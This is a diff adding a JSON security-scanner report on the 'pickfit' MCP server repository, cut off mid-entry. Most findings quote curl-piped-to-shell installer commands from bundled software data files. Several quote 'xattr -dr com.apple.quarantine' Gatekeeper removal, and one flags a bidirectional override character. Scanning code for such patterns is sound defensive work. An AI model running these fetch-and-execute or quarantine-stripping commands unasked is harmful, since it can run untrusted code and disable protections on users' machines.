@@ -1,0 +1,3556 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "ncchen99/pickfit",
+    "version": "1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51",
+    "download": "https://codeload.github.com/ncchen99/pickfit/tar.gz/1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51"
+  },
+  "archive_sha256": "f0f012bdb4a75c327d3523125b9f4ed6823454bc04e45c61d401e8ff4fa95b92",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/pickfit/verify/verdict.py",
+      "line": 275,
+      "evidence": "curl ... | bash",
+      "file_sha256": "68acdc00db95620e19be4b71f5dba253dabfe25b97a494153200a5467bb5164c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/pickfit/verify/mcp_probe.py",
+      "line": 57,
+      "evidence": "\\u{202a}",
+      "file_sha256": "39e9f830bab524f6c6afbba55023ef540096e682c3807a53bb13915e5a164d52"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/pickfit/verify/agent.py",
+      "line": 640,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "ef4d51551fd77b51f893e51ec66edaf06c9d7a44d4c8e5464255d19b4dbd8f01"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/i18n/zh-TW/quickrecorder.json",
+      "line": 15,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "d26ca509b907b5d6128ac820e8122a74230d108d1d0e5da4c412050bcfb50af4"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/i18n/zh-TW/charoite-audio.json",
+      "line": 37,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "311ed2713746920fdd9beb9f5de3063bd0dd2ee05482130ad0d5023449f95ef3"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/i18n/zh-TW/hilbertraum.json",
+      "line": 47,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "fdbc16c7d647e25b2c16ff65377dff367a97bb3dc79f8a86b3355ac6b8f27d57"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/i18n/zh-TW/yana-ai.json",
+      "line": 29,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "cf37e1cf78b7ff61589af05761dc6547bc9f7c01bac659f78468d39762a82d7e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/i18n/zh-TW/puffpaibuildbot.json",
+      "line": 32,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "5baa767b285f11e9f8f2e1b64f67463c6192638eaa305cebba56cb831a485854"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/i18n/zh-TW/quill.json",
+      "line": 24,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "9c532aa305513e35274fa724a16a2f5d19132fa3ae5c5544ee0eb78369c9281b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/saige.json",
+      "line": 538,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/urmzd/saige/main/install.sh | bash",
+      "file_sha256": "51e9f96b895fa0939890eba49e0cf42acd62615f48493b9fc0995aa38e120040"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/ninferno.json",
+      "line": 171,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Brontir/NInferno/master/tools/relea",
+      "file_sha256": "f6b6cc8141d814c138dd49e72b1a155ee930f3da93e092282ef4b8898dd09bfd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/corvus.json",
+      "line": 346,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Albasha0x0/Corvus/main/install.sh |",
+      "file_sha256": "04587c62d36e1c6662c5c512940f16b35b3820c1a61e410ee723c56f1b6166f1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/agentmesh.json",
+      "line": 69,
+      "evidence": "curl -sL https://google.github.io/agentmesh/install.sh | bash",
+      "file_sha256": "4667bca9bdad44ed06adff61e94fa1a65d99e58de696662ceedf86553f781c04"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/flashagent.json",
+      "line": 698,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/flashback7766/FlashAgent/main/insta",
+      "file_sha256": "c1dd302d333b18c00cc829c2aad8ed1386cf3b8103e32390fbaebe7cd13a57ad"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mora.json",
+      "line": 88,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/pyranthus-hq/mora/main/install.sh |",
+      "file_sha256": "1e893fe5cf0dab3a5eb21469531ad7559b97211feb179e35a5c80f6710e9aae0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/podiom.json",
+      "line": 294,
+      "evidence": "curl -fsSL .../install.sh | bash",
+      "file_sha256": "a659ee0029c161b72daeeb193c4d6e00e55b7ccc74b00e869927838ce0c3ddb3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/openshield.json",
+      "line": 228,
+      "evidence": "curl install.sh | bash",
+      "file_sha256": "25df2521efb188e9bf83b4721f24b53676d035dcc24514886147f549788e634e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/slumber.json",
+      "line": 424,
+      "evidence": "curl --proto '=https' --tlsv1.2 -LsSf https://github.com/LucasPickering/slumber/",
+      "file_sha256": "3d0f7092afaeee4feed4c9a4907fbe5db97fcd4a71f1605b89b600bd7bafb14e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/xh.json",
+      "line": 216,
+      "evidence": "curl -sfL https://raw.githubusercontent.com/ducaale/xh/master/install.sh | sh",
+      "file_sha256": "7f0feb1e06c880252502dd27d491cad89536f14c3533a67420de541f20a8e73f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mi-lsp.json",
+      "line": 416,
+      "evidence": "curl -fsSL .../install-agent.sh | sh",
+      "file_sha256": "b3ffee8ab18fb371240b5381b31d9d35b6cbebdc1a3d0a3918ddfe9d00a0920c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/jitllm.json",
+      "line": 527,
+      "evidence": "curl -fsSL https://jitllm.org/install.sh | sh",
+      "file_sha256": "87533f7d784d10ae55c125f2ed83224e519cc3790ea717c49348505ca8fb8cee"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/gptadmin-opensource.json",
+      "line": 64,
+      "evidence": "curl -s https://raw.githubusercontent.com/megamen32/gptadmin_opensource/main/dep",
+      "file_sha256": "e76e83d5ae27fb223a243982df8b7c2a8f83e5b1371393a59e8e15c3ac4054c9"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/quickrecorder.json",
+      "line": 101,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "7aac2389a288025e97b5d8bbe84e9ffa3c0ef5fbeefc26ab9a67ecee5087933b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mlxtop.json",
+      "line": 768,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/maximpri/mlxtop/main/scripts/instal",
+      "file_sha256": "057eb7df0005aed71ac3fd1a38f67fe65f8408fbff6b9c5144d538fe2a6bed4a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/sivtr.json",
+      "line": 726,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Ariestar/sivtr/main/install.sh | sh",
+      "file_sha256": "7375711073b71a08751b7e1032fea8f477f4a90ef383a9fbf343a41399ce43c7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/indexio.json",
+      "line": 897,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/IOServicesLabs/indexio/main/install",
+      "file_sha256": "6f79cb1dac85028951dad44a6656c74184fd50ba6eb00b2928c5474bcb40d149"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/n-memory.json",
+      "line": 292,
+      "evidence": "curl --proto '=https' --tlsv1.2 -fsSL https://no.tt/install.sh | sh",
+      "file_sha256": "f770d293d59dfd716d3ab1e3a98f5a2c9e5448a820020f7274970fccb77ffeb5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/gui-agent.json",
+      "line": 992,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/leandre755/gui_agent/7a49514/linux/",
+      "file_sha256": "02e9185418bb0ebd343088deb275d3e1e6fd13af6584b3e582dcb372e8a81aec"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/eullm.json",
+      "line": 193,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/eullm/eullm/main/installer/install.",
+      "file_sha256": "a5d228755b5dc40e10a4e49a21f015bfc58f0088d01ae8534ef8f1929e44187b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/xmatrix.json",
+      "line": 205,
+      "evidence": "curl -fsSL https://xmatrix.sh/install.sh | bash",
+      "file_sha256": "d744b18929b1683f34f87493c20864b208be92cffbb579317e2d42f901acab92"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/akm.json",
+      "line": 706,
+      "evidence": "curl -fsSL https://github.com/itlackey/akm/releases/latest/download/install.sh |",
+      "file_sha256": "42851cf2ece2e56b923316656513992311b454449b78536f294e581e5d868d99"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/praana.json",
+      "line": 471,
+      "evidence": "curl -fsSL .../install.sh | bash",
+      "file_sha256": "eaacf63311af1d572d1b9c29c347eac50ec606d144339413239e5d1646b730ba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/llama-cpp.json",
+      "line": 264,
+      "evidence": "curl -LsSf https://llama.app/install.sh | sh",
+      "file_sha256": "98f5efa53b6e49d2e812d8484ceefb30739d459206b43cb02b932f14030dc785"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/shura.json",
+      "line": 186,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/hikkian/shura/main/setup.sh | bash",
+      "file_sha256": "32fba9661f6461fc62a5134ee3e65cb5c4bc1fa832f5afa61076253dfc142a80"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/hako-code.json",
+      "line": 344,
+      "evidence": "curl -fsSL https://mithraeums.github.io/hako.sh | sh",
+      "file_sha256": "975244cabec28217f5b9bfbf43069b622bd4102817fbc70697f3acad2f9c2500"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/fx.json",
+      "line": 238,
+      "evidence": "curl https://fx.wtf/install.sh | sh",
+      "file_sha256": "4ad97cf2560fdc303e038704ca321e5477a7916cd20accbb930f69c9816e975a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/neboto-tui.json",
+      "line": 339,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/neboto/neboto-tui/main/install.sh |",
+      "file_sha256": "fc26577b37693e3f5dfb61375a803380b6a458f429ffd6814c7b88d0c54ae267"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/alter-zero.json",
+      "line": 634,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/linuztx/alter-zero/main/install.sh ",
+      "file_sha256": "1f70d4e964b238724521a138e0470ea380ff0bfff1c0f5913108095e4fe179ae"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mnemoteca.json",
+      "line": 106,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/RunWield/mnemoteca/main/install.sh ",
+      "file_sha256": "683dbf28e3120634b3d9daf8c4ef3fa85a8abb1a423c1191932a94ff34f8bd47"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/scribe.json",
+      "line": 1048,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/oliver-kriska/scribe/main/install.s",
+      "file_sha256": "1610d41ee824c482dfa61b287308b60b5448fa59b326b301aa30db411dc6b5be"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/memnest.json",
+      "line": 92,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Blue-B/memnest/main/core/scripts/in",
+      "file_sha256": "065d3ea800761037712f9775143dd687c97e5b34fe92ae3730aa6a1c75435d23"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/apogee.json",
+      "line": 586,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "3690b6cfaf713bd50f7860847b36964f6522516241a83ecb0c01f8244e5819a3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/goose.json",
+      "line": 66,
+      "evidence": "curl -fsSL https://github.com/aaif-goose/goose/releases/download/stable/download",
+      "file_sha256": "6aa59de74893a30a6e4692de9810137cbfb34ebff658b910344d83773e52c2ae"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/future-os.json",
+      "line": 223,
+      "evidence": "curl -fsSL https://dl.future-os.cn/install.sh | bash",
+      "file_sha256": "fcb336a51b02009a28cfa1a0260451084ebb9be91b0fe1e8319aa6a2ce4466ab"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/openharness.json",
+      "line": 70,
+      "evidence": "curl -fsSL https://harness.autonomous.ai/cli/install.sh | bash",
+      "file_sha256": "47802e266c6b1f330b030736a0508c107820685eff6bcc708d5bd57bac529928"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/bigmoeonedge.json",
+      "line": 79,
+      "evidence": "curl -fsSL https://github.com/Helldez/BigMoeOnEdge/releases/latest/download/inst",
+      "file_sha256": "8a3c3a0d93db189c8815001a3a60c12b5a4353a94b086902aa89f92c2232166b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/rei.json",
+      "line": 296,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/lucasaguilar/rei/main/install.sh | ",
+      "file_sha256": "ca321e656af172fd387255daca83aad43dbb7117b5946bbf07bcf51aca256440"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mq.json",
+      "line": 73,
+      "evidence": "curl -sSL https://mqlang.org/install.sh | bash",
+      "file_sha256": "d9ee0d4dab3f6c8e256f97737fc5e3f47d36708fb17b06e39b36b21eb2bef2a5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/rustcode.json",
+      "line": 530,
+      "evidence": "curl -fsSL https://rustcode.lhagfoss.com/install.sh | bash",
+      "file_sha256": "4fb64fc69e39c6e22879ee63667af3404c48619150390d32a12ad352206614f7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/lazydb.json",
+      "line": 219,
+      "evidence": "curl -fsSL https://lazydb.yelog.org/install.sh | sh",
+      "file_sha256": "3cd9f6b439fc5e875d2086f070f310db6d59b17af0bbeb0e69cc2db65da3ed97"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/frink.json",
+      "line": 379,
+      "evidence": "curl -fsSL .../install.sh | bash",
+      "file_sha256": "a4460e2caeab832b089bc3533b26bcebf63fb5e1220fa3b1d8db9e8314c93edd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/llmschema.json",
+      "line": 75,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/tordrt/llmschema/main/install.sh | ",
+      "file_sha256": "189cd55e3282af8865e9ce66251fdc8875f4168815c19b5e4c815a6e948ffa34"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/orangu.json",
+      "line": 103,
+      "evidence": "curl -fsSL https://mnemosyne-systems.github.io/orangu/install.sh | sh",
+      "file_sha256": "2d58f4e2c12f9bb8aed9881e69eb13fae5034eab3c39d96fd098f6cc80c64b27"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/guaardvark.json",
+      "line": 222,
+      "evidence": "curl -fsSL https://guaardvark.com/install.sh | bash",
+      "file_sha256": "f0cc1481337fd488012b2769324645903bded6f9e0475b37ff7043fdc7d48031"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/clai.json",
+      "line": 415,
+      "evidence": "curl -fsSL https://downloads.clai.aniketpandey.website/install/install.sh | sh",
+      "file_sha256": "7360b1df743b4da5dbe3e189753d2189d2e09d835ccaf24faa02f4d224c6eea7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/charoite-audio.json",
+      "line": 208,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "2ad1f7d527ec68ec4f888adc781a15cc75e538e59842343385450933051def58"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/logseq.json",
+      "line": 1083,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/logseq/logseq/master/scripts/instal",
+      "file_sha256": "c5691e7791f14b7b3652241266157aaca93e95f676b6aa55f8a5e2826f425d4f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/zoxide.json",
+      "line": 328,
+      "evidence": "curl -sSfL https://raw.githubusercontent.com/ajeetdsouza/zoxide/main/install.sh ",
+      "file_sha256": "274a167929d46867f0280eb7bdf131265ae2ed88b057114e44530df43f73c097"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/llmman.json",
+      "line": 65,
+      "evidence": "curl -fsSL https://llmmanorg.github.io/install.sh | sh",
+      "file_sha256": "1a1b7c239dc6e4448ab0051afe54fa03099aba737fe3ce4523ccd1ef7acb9763"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/termscp.json",
+      "line": 72,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSLf https://termscp.rs/install.sh | sh",
+      "file_sha256": "cbc5dce4b47210faea0bd69efedf595e6da97f92b403eaa3d1c152204e2336f5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/tiingo-mcp.json",
+      "line": 1050,
+      "evidence": "curl --proto '=https' --tlsv1.2 -LsSf https://github.com/major7apps/tiingo-mcp/r",
+      "file_sha256": "7b94cd5057fa4e3b857c956c41d3241ac5f0ecebccaff632b73600632268a656"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/voxclip.json",
+      "line": 542,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/fmueller/voxclip/main/scripts/insta",
+      "file_sha256": "d13b9fd6e49d90b605a52fd4c296fc00b2e213c9e1d511ff599fe206bda64c5d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/starship.json",
+      "line": 309,
+      "evidence": "curl -sS https://starship.rs/install.sh | sh",
+      "file_sha256": "b222c53823927988614dd6572a73d68c1a3dd867036f1d81f559bef4b88758c3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/masume.json",
+      "line": 94,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/masumedb/masume/master/install.sh |",
+      "file_sha256": "de7fde481cba0e04715d83174890e28a0090885f4715f5f830c9aa632390f4c3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/speech-cpp.json",
+      "line": 163,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/nyosegawa/speech.cpp/main/install.s",
+      "file_sha256": "80d8918017e459bbc51606f61b511127d351340cb9a0c113ee75c0fd3f2ad1c4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/lixbon.json",
+      "line": 198,
+      "evidence": "curl -fsSL https://lixbon.com/install.sh | bash",
+      "file_sha256": "e20fa3f75077d059a178b22c401dadbadd6cfe8072379de49af2940fe20bdc60"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
